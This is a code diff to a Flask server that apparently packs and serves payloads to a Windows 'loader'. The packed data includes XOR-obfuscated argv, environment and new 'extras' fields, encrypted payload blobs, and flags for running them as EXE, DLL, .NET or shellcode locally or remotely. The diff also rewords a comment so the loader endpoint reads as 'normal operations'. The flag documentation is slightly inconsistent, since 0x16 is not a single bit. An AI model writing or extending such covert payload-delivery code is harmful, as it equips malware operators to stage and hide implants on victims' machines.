@@ -149,7 +149,7 @@ def dataroute():
         args.append('')
     return packer(args[0], args[1], args[2])
 
-#This is the api used when the loader 
+#This is the api used for normal operations
 @app.route('/api/<id>', methods=['GET'])
 def apiroute(id):
     return packer(id, '', '')
@@ -259,6 +259,7 @@ def packer(id, query, uid):
             argv_files = []
             envp_files = []
             flag_files = []
+            extra_files = []
             payload_files = []
             for (root, _, filenames) in os.walk('static/' + id + '/' + send_arg):
                 for filename in filenames:
@@ -269,6 +270,8 @@ def packer(id, query, uid):
                         envp_files.append(path)
                     elif filename.endswith(".flags"):
                         flag_files.append(path)
+                    elif filename.endswith(".extras"):
+                        extra_files.append(path)
                     else:
                         payload_files.append(path)
             payload_files.sort()
@@ -285,6 +288,7 @@ def packer(id, query, uid):
                 argv = []
                 envp = []
                 flags = []
+                extras = []
                 flagsum = 0
                 try:
                     argv.append(exe_name.encode("utf-8"))
@@ -293,6 +297,10 @@ def packer(id, query, uid):
                     pass
                 try:
                     envp = open(payload_name + ".envp", 'rb').read().splitlines()
+                except:
+                    pass
+                try:
+                    extras = open(payload_name + ".extras", 'rb').read().splitlines()
                 except:
                     pass
                 try:
@@ -317,16 +325,24 @@ def packer(id, query, uid):
                     for x in val: 
                         result.append(x ^ 0xFE)
                     obfv_envp.append(bytes(result))
+                
+                obfv_extras = []
+                for val in extras: 
+                    result = bytearray(b'')
+                    for x in val: 
+                        result.append(x ^ 0xFE)
+                    obfv_extras.append(bytes(result))
 
                 filemeta = bytearray(b'')
                 #in order to make a 4byte int
-                meta = np.empty((6,), dtype=np.int32)
+                meta = np.empty((7,), dtype=np.int32)
                 meta[0] = flagsum
                 meta[1] = len(obfv_argv)
                 meta[2] = len(obfv_envp)
-                meta[3] = len(current_file)
-                meta[4] = len(compressed_file)
-                meta[5] = len(encrypted_file)
+                meta[3] = len(obfv_extras)
+                meta[4] = len(current_file)
+                meta[5] = len(compressed_file)
+                meta[6] = len(encrypted_file)
 
                 filemeta.extend(bytes(meta))
 
@@ -341,6 +357,12 @@ def packer(id, query, uid):
                     envplen[0] = len(obfv_envp[idx])
                     filemeta.extend(bytes(envplen))
                     filemeta.extend(obfv_envp[idx])
+
+                for idx in range(len(obfv_extras)):
+                    extralen = np.empty((1,), dtype=np.int32)
+                    extralen[0] = len(obfv_extras[idx])
+                    filemeta.extend(bytes(extralen))
+                    filemeta.extend(obfv_extras[idx])                    
 
                 fileblob = bytearray(b'')
                 fileblob.extend(encrypted_file)
@@ -357,6 +379,7 @@ def packer(id, query, uid):
                 4 byte  - (8 boolean flags)
                 4 bytes - number of argv
                 4 bytes - number of envp
+                4 bytes - number of extras (These extras may be used by the loader for any purpose)
                 4 bytes - original size
                 4 bytes - compressed size
                 4 bytes - encrypted size
@@ -366,14 +389,24 @@ def packer(id, query, uid):
                 envp data (as many as there are envp)
                     4 bytes - len of env
                     x bytes - env arg
+                extra data (as many as there are extra data)
+                    4 bytes - len of extra
+                    x bytes - extra 
             Blobs (after all blob metas)
                 Raw bytes
             '''
 
             '''
             Possible boolean flags (1 is set, default is 0)
-            0x1 - Hold execution of next execution til this one finishes (default is parallel execution)
-            0x2 - Write to disk if non exe, (default is no)
+            0x1   - Hold execution of next execution til this one finishes (default is parallel execution)
+            0x2   - Write to disk if non exe, (default is no)
+            0x4   - 1 to install payload locally, 0 to install remote
+            0x8   - used with 0x16
+            0x16  - These 2 bit fields have 4 values to indicate to the Windows loader whether:
+                    0 - EXE
+                    1 - DLL
+                    2 - .NET
+                    3 - BIN
             '''
 
             finalblob.extend(bytes(count))
